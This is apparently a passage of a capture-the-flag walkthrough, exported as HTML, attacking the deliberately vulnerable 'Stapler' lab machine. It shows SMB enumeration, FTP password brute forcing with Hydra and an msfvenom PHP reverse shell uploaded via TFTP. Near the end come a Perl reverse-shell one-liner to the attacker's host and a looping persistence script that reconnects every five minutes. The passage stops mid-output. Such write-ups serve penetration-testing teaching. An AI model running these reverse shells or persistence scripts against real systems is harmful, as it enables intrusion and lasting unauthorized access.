+    <div>        Sharename       Type      Comment</div>
+    <div>        ---------       ----      -------</div>
+    <div>        print$          Disk      Printer Drivers</div>
+    <div>        kathy           Disk      Fred, What are we doing here?</div>
+    <div>        tmp             Disk      All temporary files should be stored here</div>
+    <div>        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))</div>
+    <div><br /></div>
+    <div>[...]</div>
+    <div><br /></div>
+    <div>[+] Attempting to map shares on 10.183.0.194</div>
+    <div>//10.183.0.194/print$   Mapping: DENIED, Listing: N/A</div>
+    <div>//10.183.0.194/kathy    Mapping: OK, Listing: OK</div>
+    <div>//10.183.0.194/tmp      Mapping: OK, Listing: OK</div>
+    <div>//10.183.0.194/IPC$     [E] Can't understand response:</div>
+</div>
+<div><br /></div>
+<div>We also were able to get a list of users.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>[+] Enumerating users using SID S-1-22-1 and logon username '', password ''</div>
+    <div>S-1-22-1-1000 Unix User\peter (Local User)</div>
+    <div>S-1-22-1-1001 Unix User\RNunemaker (Local User)</div>
+    <div>S-1-22-1-1002 Unix User\ETollefson (Local User)</div>
+    <div>S-1-22-1-1003 Unix User\DSwanger (Local User)</div>
+    <div>S-1-22-1-1004 Unix User\AParnell (Local User)</div>
+    <div>S-1-22-1-1005 Unix User\SHayslett (Local User)</div>
+    <div>S-1-22-1-1006 Unix User\MBassin (Local User)</div>
+    <div>S-1-22-1-1007 Unix User\JBare (Local User)</div>
+    <div>S-1-22-1-1008 Unix User\LSolum (Local User)</div>
+    <div>S-1-22-1-1009 Unix User\IChadwick (Local User)</div>
+    <div>S-1-22-1-1010 Unix User\MFrei (Local User)</div>
+    <div>S-1-22-1-1011 Unix User\SStroud (Local User)</div>
+    <div>S-1-22-1-1012 Unix User\CCeaser (Local User)</div>
+    <div>S-1-22-1-1013 Unix User\JKanode (Local User)</div>
+    <div>S-1-22-1-1014 Unix User\CJoo (Local User)</div>
+    <div>S-1-22-1-1015 Unix User\Eeth (Local User)</div>
+    <div>S-1-22-1-1016 Unix User\LSolum2 (Local User)</div>
+    <div>S-1-22-1-1017 Unix User\JLipps (Local User)</div>
+    <div>S-1-22-1-1018 Unix User\jamie (Local User)</div>
+    <div>S-1-22-1-1019 Unix User\Sam (Local User)</div>
+    <div>S-1-22-1-1020 Unix User\Drew (Local User)</div>
+    <div>S-1-22-1-1021 Unix User\jess (Local User)</div>
+    <div>S-1-22-1-1022 Unix User\SHAY (Local User)</div>
+    <div>S-1-22-1-1023 Unix User\Taylor (Local User)</div>
+    <div>S-1-22-1-1024 Unix User\mel (Local User)</div>
+    <div>S-1-22-1-1025 Unix User\kai (Local User)</div>
+    <div>S-1-22-1-1026 Unix User\zoe (Local User)</div>
+    <div>S-1-22-1-1027 Unix User\NATHAN (Local User)</div>
+    <div>S-1-22-1-1028 Unix User\www (Local User)</div>
+    <div>S-1-22-1-1029 Unix User\elly (Local User)</div>
+</div>
+<div><br /></div>
+<div>The first user listed, 'peter' is an administrator on the WordPress site. We see the user 'zoe' again as well. Elly was also a WordPress user.</div>
+<div><br /></div>
+<div>Let's try to connect to the SMB shares and see what they contain. First, we'll connect to the kathy share (anonymously) using smbclient.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/smb# smbclient //10.183.0.194/kathy -U " "%" "</div>
+    <div>Try "help" to get a list of possible commands.</div>
+    <div>smb: \&gt; ls</div>
+    <div>  .                                   D        0  Fri Jun  3 12:52:52 2016</div>
+    <div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div>
+    <div>  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016</div>
+    <div>  backup                              D        0  Sun Jun  5 11:04:14 2016</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                19478204 blocks of size 1024. 16018012 blocks available</div>
+</div>
+<div><br /></div>
+<div>Let's check out the backup directory first. Backups are notorious for having sensitive information in them.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>smb: \&gt; cd backup</div>
+    <div>smb: \backup\&gt; ls</div>
+    <div>  .                                   D        0  Sun Jun  5 11:04:14 2016</div>
+    <div>  ..                                  D        0  Fri Jun  3 12:52:52 2016</div>
+    <div>  vsftpd.conf                         N     5961  Sun Jun  5 11:03:45 2016</div>
+    <div>  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 13:14:46 2015</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                19478204 blocks of size 1024. 16018012 blocks available</div>
+</div>
+<div><br /></div>
+<div>We see a backup of the FTP service configuration as well as a backup of the WordPress site. Let's download both so we can check them out.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>smb: \backup\&gt; get vsftpd.conf vsftpd.conf</div>
+    <div>getting file \backup\vsftpd.conf of size 5961 as vsftpd.conf (970.2 KiloBytes/sec) (average 831.6 KiloBytes/sec)</div>
+    <div>smb: \backup\&gt; get wordpress-4.tar.gz wordpress-4.tar.gz</div>
+    <div>getting file \backup\wordpress-4.tar.gz of size 6321767 as wordpress-4.tar.gz (11224.7 KiloBytes/sec) (average 10966.7 KiloBytes/sec)</div>
+</div>
+<div><br /></div>
+<div>Let's also drop back and check out the kathy_stuff folder.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>smb: \backup\&gt; cd ..</div>
+    <div>smb: \&gt; cd kathy_stuff</div>
+    <div>smb: \kathy_stuff\&gt; ls</div>
+    <div>  .                                   D        0  Sun Jun  5 11:02:27 2016</div>
+    <div>  ..                                  D        0  Fri Jun  3 12:52:52 2016</div>
+    <div>  todo-list.txt                       N       64  Sun Jun  5 11:02:27 2016</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                19478204 blocks of size 1024. 16018008 blocks available</div>
+    <div>smb: \kathy_stuff\&gt; get todo-list.txt todo-list.txt</div>
+    <div>getting file \kathy_stuff\todo-list.txt of size 64 as todo-list.txt (6.9 KiloBytes/sec) (average 10794.6 KiloBytes/sec)</div>
+</div>
+<div><br /></div>
+<div>Before digging into the files we downloaded, let's check out the /tmp share as well.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/smb# smbclient //10.183.0.194/tmp -U " "%" "</div>
+    <div>Try "help" to get a list of possible commands.</div>
+    <div>smb: \&gt; ls</div>
+    <div>  .                                   D        0  Tue Jun  7 04:08:39 2016</div>
+    <div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div>
+    <div>  ls                                  N      274  Sun Jun  5 11:32:58 2016</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                19478204 blocks of size 1024. 16018008 blocks available</div>
+</div>
+<div><br /></div>
+<div>The share only contains a single 'ls' file. Downloading and viewing the file contents, it appears to be a listing of the system's /tmp directory. Maybe this tmp share maps directly to the system's /tmp directory. With that in mind, I try to upload a file to the directory... and it works! Good to know.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>smb: \&gt; put tmp-ls my-tmp-ls</div>
+    <div>putting file tmp-ls as \my-tmp-ls (44.6 kb/s) (average 44.6 kb/s)</div>
+    <div>smb: \&gt; ls</div>
+    <div>  .                                   D        0  Fri Apr 19 10:44:48 2019</div>
+    <div>  ..                                  D        0  Mon Jun  6 17:39:56 2016</div>
+    <div>  my-tmp-ls                           A      274  Fri Apr 19 10:44:48 2019</div>
+    <div>  ls                                  N      274  Sun Jun  5 11:32:58 2016</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>                19478204 blocks of size 1024. 16018004 blocks available</div>
+</div>
+<div><br /></div>
+<div>Now, let's dig into our downloaded files. </div>
+<div><br /></div>
+<div>The wordpress-4.tar.gz looks like it only contains a clean download of WordPress. A wp-config.php file doesn't exist. 😞</div>
+<div><br /></div>
+<div>Next, we'll take a look at vsftpd.conf.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/smb# cat vsftpd.conf | grep -v '^#' | grep -v '^$'</div>
+    <div>listen=YES</div>
+    <div>listen_ipv6=NO</div>
+    <div>anonymous_enable=YES</div>
+    <div>anon_root=/var/ftp/anonymous</div>
+    <div>local_enable=YES</div>
+    <div>dirmessage_enable=YES</div>
+    <div>use_localtime=YES</div>
+    <div>xferlog_enable=YES</div>
+    <div>connect_from_port_20=YES</div>
+    <div>banner_file=/etc/vsftpd.banner</div>
+    <div>chroot_local_user=YES</div>
+    <div>userlist_enable=YES</div>
+    <div>local_root=/etc</div>
+    <div>secure_chroot_dir=/var/run/vsftpd/empty</div>
+    <div>pam_service_name=vsftpd</div>
+    <div>rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem</div>
+    <div>rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key</div>
+    <div>ssl_enable=NO</div>
+    <div>pasv_enable=no</div>
+</div>
+<div><br /></div>
+<div>The first thing we notice is that anonymous FTP access is allowed. We haven't even looked at the FTP service much (beyond trying to brute force passwords). Let's connect to it anonymously real quick and just see what is out there.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# ftp 10.183.0.194</div>
+    <div>Connected to 10.183.0.194.</div>
+    <div>220-</div>
+    <div>220-|-----------------------------------------------------------------------------------------|</div>
+    <div>220-| Harry, make sure to update the banner when you get a chance to show who has access here |</div>
+    <div>220-|-----------------------------------------------------------------------------------------|</div>
+    <div>220-</div>
+    <div>220</div>
+    <div>Name (10.183.0.194:root): anonymous</div>
+    <div>331 Please specify the password.  </div>
+    <div>Password:</div>
+    <div>230 Login successful.</div>
+    <div>Remote system type is UNIX.</div>
+    <div>Using binary mode to transfer files.</div>
+    <div>ftp&gt; ls</div>
+    <div>200 PORT command successful. Consider using PASV.</div>
+    <div>150 Here comes the directory listing.</div>
+    <div>-rw-r--r--    1 0        0             107 Jun 03  2016 note</div>
+    <div>226 Directory send OK.</div>
+    <div>
+        <div>ftp&gt; get note note</div>
+        <div>local: note remote: note</div>
+        <div>200 PORT command successful. Consider using PASV.</div>
+        <div>150 Opening BINARY mode data connection for note (107 bytes).</div>
+        <div>226 Transfer complete.</div>
+        <div>107 bytes received in 0.00 secs (30.9882 kB/s)</div>
+    </div>
+</div>
+<div><br /></div>
+<div>The only file available is 'note'. We downloaded that and it contains the following...</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# cat note</div>
+    <div>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</div>
+</div>
+<div><br /></div>
+<div>Elly and John were both WordPress users. So was Harry (referenced in the FTP banner).</div>
+<div><br /></div>
+<div>From the note, it seems we can be pretty sure Elly is a valid FTP user. Also, everywhere we've seen Elly's account listed, it has just been her name, so we can feel pretty confident her FTP account username is just 'elly'. Let's try brute forcing the FTP service one more time to try to find her credentials.</div>
+<div><br /></div>
+<div>We'll start by checking the obvious variations by using the '-e nsr' option. (try "n" null password, "s" login as pass and/or "r" reversed login)</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# hydra -o ftp-crack -L wordpress-users -e nsr ftp://10.183.0.194</div>
+    <div>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-19 18:18:22</div>
+    <div>[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:10/p:3), ~2 tries per task</div>
+    <div>[DATA] attacking ftp://10.183.0.194:21/</div>
+    <div>[21][ftp] host: 10.183.0.194   login: elly   password: ylle</div>
+    <div>1 of 1 target successfully completed, 1 valid password found</div>
+    <div>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-19 18:18:29</div>
+</div>
+<div><br /></div>
+<div>Well, there you go. Didn't need a massive dictionary after all. Let's try to connect to the FTP service with Elly's credentials. <span style="font-style: italic;">(NOTE: We also verified these credentials work for Elly's account on the WordPress site.)</span></div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# ftp 10.183.0.194</div>
+    <div>Connected to 10.183.0.194.</div>
+    <div>220- </div>
+    <div>220-|-----------------------------------------------------------------------------------------|</div>
+    <div>220-| Harry, make sure to update the banner when you get a chance to show who has access here |</div>
+    <div>220-|-----------------------------------------------------------------------------------------|</div>
+    <div>220- </div>
+    <div>220  </div>
+    <div>Name (10.183.0.194:root): elly</div>
+    <div>331 Please specify the password.</div>
+    <div>Password:</div>
+    <div>230 Login successful.</div>
+    <div>Remote system type is UNIX.</div>
+    <div>Using binary mode to transfer files.</div>
+</div>
+<div><br /></div>
+<div>Nice! The other thing that stood out in the vsftpd.conf file is that 'local_root' was set to /etc. That means we should be able to pull down all/most of the victim's configuration files. We might also be able to write to files. Let's check it out.</div>
+<div><br /></div>
+<div>First, we'll try to download as much as we can with wget.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/etc# mkdir etc</div>
+    <div>root@kali:~/Walkthroughs/stapler/etc# cd etc</div>
+    <div>root@kali:~/Walkthroughs/stapler/etc# wget --no-passive -m --user=elly --password=ylle ftp://10.183.0.194</div>
+</div>
+<div><br /></div>
+<div>Looking at the phpmyadmin.conf config file (for Apache), we see the phpmyadmin site is still setup to allow access to /phpmyadmin/setup. It is using Basic auth, so we should be able to (at least try) brute force the credentials.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div># Authorize for setup</div>
+    <div>&lt;Directory /usr/share/phpmyadmin/setup&gt;</div>
+    <div>    &lt;IfModule mod_authz_core.c&gt;</div>
+    <div>        &lt;IfModule mod_authn_file.c&gt;</div>
+    <div>            AuthType Basic</div>
+    <div>            AuthName "phpMyAdmin Setup"</div>
+    <div>            AuthUserFile /etc/phpmyadmin/htpasswd.setup</div>
+    <div>        &lt;/IfModule&gt;</div>
+    <div>        Require valid-user</div>
+    <div>    &lt;/IfModule&gt;</div>
+    <div>&lt;/Directory&gt;</div>
+</div>
+<div><br /></div>
+<div>Looks like the /phpmyadmin/setup page is available if we have the right credentials. Let's see if we can view the /etc/phpmyadmin/htpasswd.setup file. Nope. Don't have permission. Can't access /etc/phpmyadmin/config-db.php either.</div>
+<div><br /></div>
+<div>Looking at the rc.local file, we see how the HTTP service on TCP port 80 is started along with what home directory it is serving files out of.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/etc/10.183.0.194# cat rc.local </div>
+    <div>#!/bin/sh -e</div>
+    <div>#</div>
+    <div># rc.local</div>
+    <div>#</div>
+    <div># This script is executed at the end of each multiuser runlevel.</div>
+    <div># Make sure that the script will "exit 0" on success or any other</div>
+    <div># value on error.</div>
+    <div>#</div>
+    <div># In order to enable or disable this script just change the execution</div>
+    <div># bits.</div>
+    <div>#</div>
+    <div># By default this script does nothing.</div>
+    <div>/root/fix-wordpress.sh</div>
+    <div>/root/python.sh &amp;&gt;/dev/null &amp;</div>
+    <div>/usr/local/src/nc.sh &amp;&gt;/dev/null &amp;</div>
+    <div>su -c 'authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null' www &amp;&gt;/dev/null &amp;</div>
+    <div>exit 0</div>
+</div>
+<div><br /></div>
+<div>Let's see if any other config files contain the '/home/www' path.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler/etc/10.183.0.194# grep -ri '/home/www' *</div>
+    <div>default/atftpd:OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /home/www"</div>
+    <div>passwd:www:x:1028:1028::/home/www:</div>
+    <div>rc.local:su -c 'authbind php -S 0.0.0.0:80 -t /home/www/ &amp;&gt;/dev/null' www &amp;&gt;/dev/null &amp;</div>
+</div>
+<div><br /></div>
+<div>Interesting. According to the default/atftpd file, there is a TFTP service that is saving files in /home/www. 😄 BINGO! We should be able to upload our PHP reverse shll to the directory using TFTP and then access it from the HTTP service on TCP port 80.</div>
+<div><br /></div>
+<div>I'll create my PHP reverse shell with msfvenom.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div>
+    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
+    <div>[-] No arch selected, selecting arch: php from the payload</div>
+    <div>No encoder or badchars specified, outputting raw payload</div>
+    <div>Payload size: 3043 bytes</div>
+</div>
+<div><br /></div>
+<div>Now, I'll upload it to /home/www using TFTP.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# tftp</div>
+    <div>tftp&gt; connect 10.183.0.194</div>
+    <div>tftp&gt; put rev.php</div>
+    <div>Sent 3153 bytes in 0.0 seconds</div>
+</div>
+<div><br /></div>
+<div>That seemed to work. I'll start my handler for the reverse PHP shell on TCP port 5432 and a second listener for a generic reverse shell on TCP port 5433. I like to do this because the PHP reverse shell doesn't stay active for long.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div>
+    <div>payload =&gt; php/reverse_php</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
+    <div>LPORT =&gt; 5432</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 0.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
+    <div>msf5 exploit(multi/handler) &gt; </div>
+    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
+    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
+    <div>payload =&gt; generic/shell_reverse_tcp</div>
+    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
+    <div>LHOST =&gt; 10.183.0.222</div>
+    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
+    <div>LPORT =&gt; 5433</div>
+    <div>msf5 exploit(multi/handler) &gt; run -j</div>
+    <div>[*] Exploit running as background job 1.</div>
+    <div>[*] Exploit completed, but no session was created.</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
+</div>
+<div><br /></div>
+<div>Moment of truth. Let's request our reverse shell using curl.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.194:40572) at 2019-04-20 00:38:19 -0400</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
+    <div>[*] Starting interaction with 1...</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>pwd</div>
+    <div>/home/www</div>
+    <div>id</div>
+    <div>uid=1028(www) gid=1028(www) groups=1028(www)</div>
+    <div>perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' &amp;</div>
+    <div>[*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.194:37464) at 2019-04-20 00:39:00 -0400</div>
+</div>
+<div><br /></div>
+<div>Great! We got our PHP reverse shell connected, then started another reverse shell using perl.</div>
+<div><br /></div>
+<div><br /></div>
+<div>
+    <h2>Maintaining Access</h2>
+</div>
+<div><br /></div>
+<div>My www account doesn't have a default shell defined, so I won't be able to SSH to the server with this account.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:~$ grep `whoami` /etc/passwd</div>
+    <div>www:x:1028:1028::/home/www:</div>
+</div>
+<div><br /></div>
+<div>I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>root@kali:~/Walkthroughs/stapler# cat thumbs</div>
+    <div>#!/bin/sh</div>
+    <div>while true; do</div>
+    <div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</div>
+    <div>    # sleep for 300 seconds (5 mins)</div>
+    <div>    sleep 300</div>
+    <div>done</div>
+    <div>root@kali:~/Walkthroughs/stapler# python -m SimpleHTTPServer 4321</div>
+    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
+</div>
+<div><br /></div>
+<div>I started python's SimpleHTTPServer module so I can upload the script to the victim's /var/www/https/blogblog/wp-content/uploads directory and run it in the background. That way if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
+<div><br /></div>
+<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
+    <div>www@red:/var/www/https/blogblog/wp-content/uploads$ wget -O thumbs 10.183.0.222:4321/thumbs     </div>
+    <div>--2019-04-20 00:55:31--  http://10.183.0.222:4321/thumbs</div>
+    <div>Connecting to 10.183.0.222:4321... connected.</div>
+    <div>HTTP request sent, awaiting response... 200 OK</div>
+    <div>Length: 307 [application/octet-stream]</div>
+    <div>Saving to: 'thumbs'</div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>thumbs              100%[===================&gt;]     307  --.-KB/s    in 0s      </div>
+    <div>
+        <div><br /></div>
+    </div>
+    <div>2019-04-20 00:55:31 (60.5 MB/s) - 'thumbs' saved [307/307]</div>
+    <div>
+        <div><br /></div>
